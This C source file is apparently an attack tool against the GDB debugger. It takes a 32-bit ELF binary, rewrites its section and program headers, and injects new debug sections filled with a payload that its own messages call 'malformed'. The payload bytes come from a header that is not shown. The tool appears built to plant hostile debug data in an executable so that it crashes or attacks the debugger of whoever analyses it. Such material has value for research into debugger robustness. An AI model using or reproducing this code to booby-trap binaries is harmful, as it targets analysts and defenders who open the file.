
#include "elf32_gdb.h"
#include "cclib.h"

int fhandle, temp_fhandle, cpx;
struct stat fstatinfo;

int main(int argc, char *argv[]){
	printf("%s",BANNER);
	if(argc<2){
		fprintf(stderr, "[%s*%s] Usage: %s <elf-file>\n", CYEL, CNRM,argv[0]);
		exit(-1);
	}

	printf("[%s*%s] Checking file...\n", CBLU, CNRM);
	if((fhandle=open(argv[1], O_RDWR))==-1){
		perror("[" CRED "-" CNRM "] Error");
		exit(-1);
	}
	
	if(!ELF_CHK(fhandle)){
		close(fhandle);
		exit(-1);
	}
   
	if(fstat(fhandle, &fstatinfo)==-1){
		perror("[" CRED "-" CNRM "] Error");
		close(fhandle);
		exit(-1);
	}
	//mmap - elf pointer
	if((elf_epptr = (char *)mmap(NULL, fstatinfo.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fhandle, 0)) == MAP_FAILED){
		perror("[" CRED "-" CNRM "] Error");
		close(fhandle);
		exit(-1);
	}/*//DEBUG
	else
		printf("ELF: %.4x\n", elf_epptr);*/

	elf_header = (Elf32_Ehdr *)(elf_epptr);
	
	
	/*!sht && !shoff*/
	if(elf_header->e_shoff==0){
		fprintf(stderr,"[%s-%s] Error: No Section Header Table", CRED, CNRM);
		close(fhandle);
		munmap(elf_epptr, 0);
		exit(-1);
	}
	/*sht,shstrtab,size init*/
	section_header_table = (Elf32_Shdr *) (elf_epptr + elf_header->e_shoff);
	shstrtab_section = (Elf32_Shdr *)(elf_epptr + elf_header->e_shoff + elf_header->e_shstrndx * sizeof(Elf32_Shdr));
	if((shstrtab_sz = shstrtab_section->sh_size) > 0){
		if(!(shstrtab_offset = shstrtab_section->sh_offset)){
			fprintf(stderr,"[%s-%s] Error: Section Header offset is zero", CRED, CNRM);
			close(fhandle);
			munmap(elf_epptr, 0);
			exit(-1);
		}
	}
	/*info shit*/
	printf("[%sINFO%s]\n", CYEL, CNRM);
	printf("\t=> File size          : %d bytes\n",(int) fstatinfo.st_size);
	printf("\t=> ELF entry point    : %s0x%.8x%s\n",CGRN ,elf_header->e_entry,CNRM);
	printf("\t=> ELF header size    : %d bytes\n",elf_header->e_ehsize);
	printf("\t=> SHT size           : %d bytes\n",elf_header->e_shnum);
	printf("\t=> SHT file offset    : %10d (%s0x%.4x%s)\n",elf_header->e_shoff,CCYN,elf_header->e_shoff,CNRM);
	printf("\t=> SHSTR index        : %10d (%s0x%.4x%s)\n",elf_header->e_shstrndx,CCYN,elf_header->e_shstrndx,CNRM);
	printf("\t=> SHSTR Table offset : %10d (%s0x%.4x%s)\n",(int)shstrtab_offset,CCYN,(int)shstrtab_offset,CNRM);
	
	
	if(!(deline_offset = chk_deline_sh())){
		printf("[%s!%s] '.debug_line' section not found, continuing...\n", CYEL, CNRM);
		if(!inject_sp()){
			fprintf(stderr,"[%s-%s] Error: Couldn't write debug headers", CRED, CNRM);
			close(fhandle);
			munmap(elf_epptr, 0);
			exit(-1);
		}
		printf("[%s+%s] Injected debug headers(debug_line, debug_info, debug_abbrev, debug_str) successfully\n", CGRN, CNRM);
		if(rename("tmplte_elf32.tmp", argv[1])==-1)
			perror("[" CRED "-" CNRM "] Error");
	}
	else{ 
		printf("[%s*%s] '.debug_line' section was found, offset=%d (%s0x%.4x%s), size=%d bytes\n", CYEL, CNRM, (int)deline_offset, CCYN, (int)deline_offset, CNRM, (int)deline_sz);
		if(deline_sz < sizeof(gdbdwf_line_header)){
			fprintf(stderr,"[%s-%s] Error: No space for '.debug_line' payload (current space:%d bytes, required space:%d bytes)", CRED, CNRM,(int)deline_sz, (int)sizeof(gdbdwf_line_header));
			exit(-1);
		}
		printf("[%s*%s] Overwriting .debug_line payload...\n", CBLU, CNRM);
		memcpy(elf_epptr + deline_offset, gdbdwf_line_header, sizeof(gdbdwf_line_header));
	}

	if(msync(elf_epptr, 0, MS_SYNC)==-1){
		perror("[" CRED "-" CNRM "] Error");
		close(fhandle);
		exit(-1);
	}
	close(fhandle);munmap(elf_epptr, 0);
	printf("[%s+%s] \"%s\" was patched successfully.\n", CGRN, CNRM, argv[1]);
	
    return 0;
}

int ELF_CHK(int fhandle){
	Elf32_Ehdr e_header;
	/*handle err */
	if(read(fhandle, &e_header, sizeof(e_header))==-1){
		perror("[" CRED "-" CNRM "] Error");
		exit(-1);
	}
	/*elf magic check*/
	if(e_header.e_ident[EI_MAG0] != ELFMAG0 || e_header.e_ident[EI_MAG1] != 'E' ||
			e_header.e_ident[EI_MAG2] != 'L' || e_header.e_ident[EI_MAG3] != 'F'){
		fprintf(stderr, "[%s-%s] Error: File is not 'ELF'\n", CRED, CNRM);
		return 0;
	}
	else
		printf("[%s*%s] ELF-Magic number (7f 45 4c 46) confirmed\n", CBLU, CNRM);
	/*arch verification*/
	if(e_header.e_ident[EI_CLASS]!=ELFCLASS32){
		fprintf(stderr, "[%s-%s] Error: File is not x86(32bit)\n", CRED, CNRM);
		return 0;
	}
	else
		printf("[%s*%s] File is 32bit ELF\n", CBLU, CNRM);
	/*endianness check*/
	if(e_header.e_ident[EI_DATA]!=ELFDATA2LSB){
		fprintf(stderr, "[%s-%s] Error: Endianness is not type 'little'\n", CRED, CNRM);
		return 0;
	}
	else
		printf("[%s*%s] ELF Little Endian\n", CBLU, CNRM);

	return 1;
}

/*check presence of debug_line*/
Elf32_Off chk_deline_sh(void){
	for(cpx=0; cpx < elf_header->e_shnum; cpx++, section_header_table++){
		if(strcmp(elf_epptr + shstrtab_offset + section_header_table->sh_name, ".debug_line") == 0){ //SIGSEV
			deline_sz = section_header_table->sh_size;
			return section_header_table->sh_offset;
		}
	}
	return 0;
}

/*create and inject*/
int inject_sp(void){
	uint_t nosi = 4;
	uint_t nseclen =  strlen(".debug_str") + strlen(".debug_info") + strlen(".debug_line") +strlen(".debug_abbrev") + 4;
	
	/*.shstrtab (and .strtab) patch*/
	shstrtab_section->sh_size = fstatinfo.st_size - shstrtab_offset + sizeof(Elf32_Shdr)*nosi + nseclen;
	printf("[%s+%s] Patched '.shstrtab' size to %d (%s%.4x%s)\n", CGRN, CNRM, shstrtab_section->sh_size, CCYN, shstrtab_section->sh_size,CNRM);
	section_header_table = (Elf32_Shdr*)(elf_epptr+elf_header->e_shoff);

	for(cpx=0; cpx < elf_header->e_shnum; cpx++, section_header_table++){
		if(strcmp(elf_epptr + shstrtab_offset + section_header_table->sh_name, ".strtab") == 0){
			section_header_table->sh_size = shstrtab_section->sh_size;
			printf("[%s+%s] Patched '.strtab' size to %d (%s%.4x%s)\n", CGRN, CNRM, shstrtab_section->sh_size, CCYN, shstrtab_section->sh_size,CNRM);
			break;
		}
	}
	
	Elf32_Shdr deline_shdr, deinfo_shdr, deabbrev_shdr, destr_shdr;
	deline_shdr.sh_type = deinfo_shdr.sh_type = deabbrev_shdr.sh_type = destr_shdr.sh_type = 0x0001;
	deline_shdr.sh_flags = deinfo_shdr.sh_flags = deabbrev_shdr.sh_flags = 0x0000;destr_shdr.sh_flags = 0x0030;
	deline_shdr.sh_addr = deinfo_shdr.sh_addr = deabbrev_shdr.sh_addr = destr_shdr.sh_addr = 0x00000000;
	deline_shdr.sh_link = deinfo_shdr.sh_link = deabbrev_shdr.sh_link = destr_shdr.sh_link = 0x0000;
	deline_shdr.sh_info = deinfo_shdr.sh_info = deabbrev_shdr.sh_info = destr_shdr.sh_info = 0x0000;
	deline_shdr.sh_addralign = deinfo_shdr.sh_addralign = deabbrev_shdr.sh_addralign = destr_shdr.sh_addralign = 0x0001;
	deline_shdr.sh_entsize = deinfo_shdr.sh_entsize = deabbrev_shdr.sh_entsize = destr_shdr.sh_entsize = 0x0000;	
	deline_shdr.sh_size = sizeof(gdbdwf_line_header);
	deinfo_shdr.sh_size = sizeof(gdb_deinfo);
	destr_shdr.sh_size = sizeof(gdb_destr);
	deabbrev_shdr.sh_size =	sizeof(gdb_deabbrev);

	deline_shdr.sh_name = fstatinfo.st_size + sizeof(Elf32_Shdr)* nosi - shstrtab_offset;
	deinfo_shdr.sh_name = fstatinfo.st_size + sizeof(Elf32_Shdr)* nosi - shstrtab_offset + strlen(".debug_line") + 1;
	destr_shdr.sh_name = fstatinfo.st_size + sizeof(Elf32_Shdr)* nosi - shstrtab_offset + strlen(".debug_line") + 2 + strlen(".debug_info");
	deabbrev_shdr.sh_name =	fstatinfo.st_size + sizeof(Elf32_Shdr)* nosi - shstrtab_offset + strlen(".debug_line") + strlen(".debug_info") + strlen(".debug_str") + 3;
		
	deline_shdr.sh_offset =	fstatinfo.st_size + sizeof(Elf32_Shdr) * nosi + nseclen;
	deinfo_shdr.sh_offset =	fstatinfo.st_size + sizeof(Elf32_Shdr) * nosi + nseclen	+ deline_shdr.sh_size;
	destr_shdr.sh_offset = fstatinfo.st_size + sizeof(Elf32_Shdr) * nosi + nseclen + deline_shdr.sh_size + deinfo_shdr.sh_size;
	deabbrev_shdr.sh_offset = fstatinfo.st_size + sizeof(Elf32_Shdr) * nosi + nseclen + deline_shdr.sh_size + deinfo_shdr.sh_size + destr_shdr.sh_size;

	Elf32_Off shdr_inspoint = elf_header->e_shoff + elf_header->e_shnum * sizeof(Elf32_Shdr);
	printf("[%s*%s] Insertion point:  0x%.8x\n", CBLU, CNRM, shdr_inspoint);

	program_header_table = (Elf32_Phdr *)(elf_epptr + elf_header->e_phoff);
	if(elf_header->e_phoff >= shdr_inspoint){
		printf("[%s!%s] Program header table offset is beyond the insertion point\n", CYEL, CNRM);
		elf_header->e_phoff += sizeof(Elf32_Shdr)*nosi;	
		printf("[%s*%s] Fixing p_offset to 0x%.4x\n", CBLU, CNRM, elf_header->e_phoff);	
	}

	for(cpx=0;cpx < elf_header->e_phnum; cpx++, program_header_table++){
		if(program_header_table->p_offset >= shdr_inspoint){
			printf("[%s!%s] Program header(%d) offset is beyond the insertion point\n", CYEL, CNRM, cpx);
			program_header_table->p_offset += sizeof(Elf32_Shdr) * nosi;
			printf("[%s*%s] Fixing p_offset to 0x%.4x\n", CBLU, CNRM, program_header_table->p_offset);	
		}
	}

	elf_header->e_shnum += nosi;
	/*reflect mapped changes*/
	if(msync(elf_epptr, 0, MS_SYNC) == -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	close(fhandle);

	if((temp_fhandle = creat("tmplte_elf32.tmp", fstatinfo.st_mode))==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	if(write(temp_fhandle, elf_epptr, shdr_inspoint)==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	/*headers*/
	printf("[%s*%s] Injecting debug headers...\n", CBLU, CNRM);

	if(write(temp_fhandle, &deline_shdr, sizeof(Elf32_Shdr))==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	else
		printf("[%s+%s] Injected '.debug_line', ", CGRN, CNRM);	
	if(write(temp_fhandle, &deinfo_shdr, sizeof(Elf32_Shdr))==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	else
		printf(", '.debug_info'");	
	if(write(temp_fhandle, &destr_shdr, sizeof(Elf32_Shdr))==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	else
		printf(", '.debug_str'");	
	if(write(temp_fhandle, &deabbrev_shdr, sizeof(Elf32_Shdr))==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	else
		printf(", '.debug_abbrev'.\n");
	/*strs*/
	if(write(temp_fhandle, elf_epptr + shdr_inspoint, fstatinfo.st_size - shdr_inspoint)==-1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}	
	if(write(temp_fhandle, ".debug_line\0", strlen(".debug_line")+1) == -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;	
	}
	if(write(temp_fhandle, ".debug_info\0", strlen(".debug_info")+1) == -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	if(write(temp_fhandle, ".debug_str\0", strlen(".debug_str")+1) == -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	if(write(temp_fhandle, ".debug_abbrev\0", strlen(".debug_abbrev")+1) == -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	/*payload*/
	printf("[%s*%s] Injecting payloads to debug headers...\n", CBLU, CNRM);
	if(write(temp_fhandle, gdbdwf_line_header, sizeof(gdbdwf_line_header))== -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	else
		printf("[%s+%s] Malformed 'debug_line' section injected, writing remaining debug headers...\n", CGRN, CNRM);
	if(write(temp_fhandle, gdb_deinfo, sizeof(gdb_deinfo))== -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	if(write(temp_fhandle, gdb_destr, sizeof(gdb_destr))== -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	if(write(temp_fhandle, gdb_deabbrev, sizeof(gdb_deabbrev))== -1){
		perror("[" CRED "-" CNRM "] Error");
		return 0;
	}
	close(temp_fhandle);
	return 1;	

}
